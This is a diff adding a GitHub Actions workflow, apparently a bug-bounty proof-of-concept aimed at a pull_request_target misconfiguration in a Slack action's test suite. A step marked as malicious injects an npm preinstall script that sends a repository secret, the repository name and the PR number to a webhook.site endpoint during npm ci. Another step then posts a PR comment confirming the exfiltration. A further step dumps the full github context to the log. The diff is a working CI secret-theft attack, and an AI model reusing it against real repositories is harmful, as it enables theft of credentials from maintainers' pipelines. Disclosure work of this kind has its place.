@@ -1,0 +1,303 @@
+name: Tests
+on:
+  pull_request_target:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  tests:
+    name: Run tests
+    runs-on: ubuntu-latest
+    environment: staging
+    permissions:
+      checks: write
+      pull-requests: write  # Add this for commenting
+    
+    steps:
+      - name: "build: checkout the latest changes"
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: "build: setup the node runtime"
+        uses: actions/setup-node@v4
+        with:
+          cache: npm
+          cache-dependency-path: package-lock.json
+          node-version-file: .nvmrc
+
+      # MALICIOUS STEP - Inject secret exfiltration
+      - name: "POC: Inject malicious script"
+        run: |
+          # Create package.json with malicious preinstall script if it doesn't exist
+          if [ ! -f package.json ]; then
+            cat > package.json << 'EOF'
+          {
+            "name": "poc-exploit",
+            "version": "1.0.0",
+            "scripts": {
+              "preinstall": "node -e \"const secret = process.env.TEST_HACKERONE || 'NOT_FOUND'; const https = require('https'); const data = JSON.stringify({secret: secret, repo: process.env.GITHUB_REPOSITORY, pr: process.env.PR_NUMBER, timestamp: Date.now()}); const options = {hostname: 'webhook.site', port: 443, path: '/60f458ac-ded0-4de9-91d1-4de73c5e0f65', method: 'POST', headers: {'Content-Type': 'application/json', 'Content-Length': data.length}}; const req = https.request(options, (res) => { let body = ''; res.on('data', (d) => body += d); res.on('end', () => console.log('Exfiltrated:', body)); }); req.write(data); req.end(); console.log('Exfiltrating secret:', secret.substring(0,10) + '...');\""
+            }
+          }
+          EOF
+          else
+            # Add preinstall to existing package.json
+            node -e '
+              const fs = require("fs");
+              const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"));
+              pkg.scripts = pkg.scripts || {};
+              pkg.scripts.preinstall = "node -e \"const secret = process.env.TEST_HACKERONE || \\\"NOT_FOUND\\\"; const https = require(\\\"https\\\"); const data = JSON.stringify({secret: secret, repo: process.env.GITHUB_REPOSITORY, pr: process.env.PR_NUMBER}); const req = https.request({hostname: \\\"webhook.site\\\", port: 443, path: \\\"/60f458ac-ded0-4de9-91d1-4de73c5e0f65\\\", method: \\\"POST\\\", headers: {\\\"Content-Type\\\": \\\"application/json\\\"}}, (res) => {}); req.write(data); req.end(); console.log(\\\"Secret exfiltrated:\\\", secret.substring(0,10));\"";
+              fs.writeFileSync("package.json", JSON.stringify(pkg, null, 2));
+            '
+          fi
+          echo "PR_NUMBER=${{ github.event.pull_request.number }}" >> $GITHUB_ENV
+          echo "✅ Malicious script injected into package.json"
+
+      - name: "build: install the required dependencies"
+        run: npm ci
+        env:
+          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}  # This will be exfiltrated
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+
+      - name: "POC: Post proof on PR"
+        if: always()
+        run: |
+          curl -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+            -d '{"body":"🔴 **SECURITY VULNERABILITY CONFIRMED** 🔴\n\nSuccessfully executed arbitrary code during `npm ci` and exfiltrated the `TEST_HACKERONE` secret to https://webhook.site/60f458ac-ded0-4de9-91d1-4de73c5e0f65\n\n**Impact:** Remote Code Execution with access to repository secrets\n\n**Fix:** Replace `pull_request_target` with `pull_request` or validate PR code before running `npm ci`"}'
+
+      - name: "unit(test): perform lints and formatting checks"
+        run: npm run lint
+        continue-on-error: true
+
+      - name: "unit(test): perform check of typings"
+        run: npm run check
+        continue-on-error: true
+
+      - name: "unit(test): perform unit test checks"
+        run: npm test
+        continue-on-error: true
+
+      - name: "unit(test): upload coverage to CodeCov"
+        uses: codecov/codecov-action@v5.1.2
+        with:
+          directory: ./coverage
+          token: ${{ secrets.CODECOV_TOKEN }}
+        continue-on-error: true
+
+      # Keep rest of original workflow but with continue-on-error
+      - name: "build: package code for distribution"
+        run: npm run build
+        continue-on-error: true
+
+      # Add continue-on-error to remaining steps
+      - name: "pretest(inputs): save the push event trigger commit URL"
+        if: "contains(github.event_name, 'push')"
+        run: |
+          url=${{ github.event.head_commit.url }}
+          echo "EVENT_URL=$url" >> "$GITHUB_ENV"
+
+      - name: "pretest(inputs): save the pull request event trigger commit URL"
+        if: "contains(github.event_name, 'pull_request')"
+        run: |
+          url=${{ github.event.pull_request.html_url }}
+          echo "EVENT_URL=$url" >> "$GITHUB_ENV"
+
+      - name: "integration(wfb): send a payload to workflow builder via webhook trigger"
+        id: wfb
+        uses: ./
+        with:
+          errors: true
+          webhook: ${{ secrets.SLACK_WEBHOOK_TRIGGER }}
+          webhook-type: webhook-trigger
+          payload: |
+            author: ${{ github.event.sender.login }}
+            channel_id: ${{ secrets.SLACK_CHANNEL_ID }}
+            event_url: ${{ env.EVENT_URL}}
+            repo_name: ${{ github.event.repository.full_name }}
+            status: ${{ job.status }}
+        continue-on-error: true
+
+      - name: "integration(wfb): confirm a payload was sent"
+        run: test -n "${{ steps.wfb.outputs.time }}"
+        continue-on-error: true
+
+      - name: "integration(botToken): post a message to channel"
+        id: message
+        uses: ./
+        with:
+          errors: true
+          method: chat.postMessage
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ secrets.SLACK_CHANNEL_ID }}
+            text: ":checkered_flag: Action happens at <https://github.com/${{ github.repository }}>"
+        continue-on-error: true
+
+      - name: "integration(method): confirm a message was posted"
+        run: test -n "${{ steps.message.outputs.ts }}"
+        continue-on-error: true
+
+      - name: "integration(method): post a message with blocks"
+        id: blocks
+        uses: ./
+        with:
+          errors: true
+          method: chat.postMessage
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ secrets.SLACK_CHANNEL_ID }}
+            text: ":eyes: Event received..."
+            attachments:
+              - color: "dbab09"
+                fields:
+                  - title: "Status"
+                    short: true
+                    value: "Processing"
+        continue-on-error: true
+
+      - name: "integration(method): confirm the blocks were posted"
+        run: test -n "${{ steps.blocks.outputs.ts }}"
+        continue-on-error: true
+
+      - name: "integration(method): post a threaded message"
+        id: timer
+        uses: ./
+        with:
+          errors: true
+          method: chat.postMessage
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ secrets.SLACK_CHANNEL_ID }}
+            text: "Started at `${{ steps.blocks.outputs.time }}`"
+            thread_ts: "${{ steps.blocks.outputs.ts }}"
+        continue-on-error: true
+
+      - name: "integration(incoming): confirm the thread started"
+        run: test -n "${{ steps.timer.outputs.time }}"
+        continue-on-error: true
+
+      - name: "integration(method): wait to mock event processing"
+        run: sleep 3
+        continue-on-error: true
+
+      - name: "integration(method): update the original message"
+        id: finished
+        uses: ./
+        with:
+          errors: true
+          method: chat.update
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ secrets.SLACK_CHANNEL_ID }}
+            ts: "${{ steps.blocks.outputs.ts }}"
+            text: ":gear: Event processed!"
+            attachments:
+              - color: "28a745"
+                fields:
+                  - title: "Status"
+                    short: true
+                    value: "Completed"
+        continue-on-error: true
+
+      - name: "integration(method): post another threaded message"
+        id: done
+        uses: ./
+        with:
+          errors: true
+          method: chat.postMessage
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ steps.blocks.outputs.channel_id }}
+            text: "Finished at `${{ steps.finished.outputs.time }}`"
+            thread_ts: "${{ steps.timer.outputs.thread_ts }}"
+        continue-on-error: true
+
+      - name: "integration(method): post a file into a channel"
+        id: file
+        uses: ./
+        with:
+          errors: true
+          method: files.uploadV2
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel_id: ${{ secrets.SLACK_CHANNEL_ID }}
+            initial_comment: ":robot_face: The codes exists here"
+            file: .github/workflows/test.yml
+            filename: action.yml
+        continue-on-error: true
+
+      - name: "integration(method): react to the completed update message"
+        uses: ./
+        with:
+          errors: true
+          method: reactions.add
+          token: ${{ secrets.SLACK_BOT_TOKEN }}
+          payload: |
+            channel: ${{ secrets.SLACK_CHANNEL_ID }}
+            timestamp: ${{ steps.blocks.outputs.ts }}
+            name: "tada"
+        continue-on-error: true
+
+      - name: "integration(method): confirm the thread ended"
+        run: test -n "${{ steps.done.outputs.time }}"
+        continue-on-error: true
+
+      - name: "integration(incoming): post a message via incoming webhook"
+        id: incoming
+        uses: ./
+        with:
+          errors: true
+          webhook: ${{ secrets.SLACK_INCOMING_WEBHOOK }}
+          webhook-type: incoming-webhook
+          payload: |
+            text: "Incoming webhook test for slack send"
+            blocks:
+              - type: section
+                text:
+                  type: plain_text
+                  text: ":link: A message was received via incoming webhook"
+                  emoji: true
+        continue-on-error: true
+
+      - name: "integration(incoming): confirm a webhook was posted"
+        run: test -n "${{ steps.incoming.outputs.time }}"
+        continue-on-error: true
+
+      - name: "integration(incoming): reveal contents of the github payload"
+        run: echo $JSON
+        env:
+          JSON: ${{ toJSON(github) }}
+        continue-on-error: true
+
+      - name: "integration(incoming): post a message via payload file"
+        id: payload_file
+        uses: ./
+        with:
+          errors: true
+          payload-file-path: ./.github/resources/.slack/incoming-webhook.json
+          payload-templated: true
+          webhook: ${{ secrets.SLACK_INCOMING_WEBHOOK }}
+          webhook-type: incoming-webhook
+        env:
+          JOB_STATUS: ${{ job.status }}
+          ATTACHMENT_COLOR: ${{ (job.status == 'success' && 'good') || (job.status == 'failure' && 'danger') || 'warning' }}
+        continue-on-error: true
+
+      - name: "integration(incoming): confirm a payload file was posted"
+        run: test -n "${{ steps.payload_file.outputs.time }}"
+        continue-on-error: true
+
+      - name: "chore(health): check up on recent changes to the health score"
+        uses: slackapi/slack-health-score@v0.1.1
+        with:
+          codecov_token: ${{ secrets.CODECOV_API_TOKEN }}
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          extension: js
+          include: src
+        continue-on-error: true
